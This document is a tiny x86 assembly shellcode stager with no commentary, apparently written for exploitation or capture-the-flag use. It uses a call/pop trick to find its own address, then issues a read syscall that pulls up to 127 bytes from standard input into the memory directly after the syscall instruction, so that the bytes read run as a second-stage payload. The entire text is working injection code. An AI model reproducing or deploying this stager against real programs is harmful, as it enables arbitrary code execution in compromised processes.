.intel_syntax noprefix
.globl _start
_start:
    jmp stager1
pc:
    pop ecx
    jmp stager2
stager1:
    xor ebx,ebx
    xor edx,edx
    xor eax,eax
    mov dl,0x7f
    mov al,0x3
    call pc
stager2:
    add ecx,0x5
    int 0x80
